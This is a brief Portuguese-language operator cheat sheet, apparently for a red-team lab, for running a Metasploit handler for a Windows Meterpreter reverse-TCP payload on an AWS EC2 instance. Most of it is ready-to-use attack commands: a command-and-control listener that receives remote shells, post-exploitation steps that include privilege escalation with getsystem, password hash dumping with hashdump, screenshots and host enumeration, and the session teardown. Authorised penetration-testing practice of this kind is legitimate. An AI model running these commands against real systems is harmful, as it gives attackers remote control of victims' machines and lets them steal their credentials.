
# Handler Meterpreter na EC2

## Subir (sessão nova)

```bash
ssh -i ~/aws/redteam-lab.pem ubuntu@<IP_EC2>
screen -S c2
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 0.0.0.0; set LPORT 8443; \
  set ExitOnSession false; run -j"
```
# desanexar: Ctrl+A depois D  |  voltar: screen -r c2

## Comandos pós-exploração básica (coleta para o relatório)

```
meterpreter> getuid
meterpreter> sysinfo
meterpreter> screenshot
meterpreter> hashdump          # requer SYSTEM (getsystem)
meterpreter> run post/windows/gather/checkvm
meterpreter> run post/windows/gather/enum_applications

```

## Encerramento da sessão (higiene do laboratório)

```
meterpreter> exit
msf6> jobs -K
exit
# dentro da EC2: screen -X -S c2 quit
# console AWS: Stop instance

```

### Fim do jogo


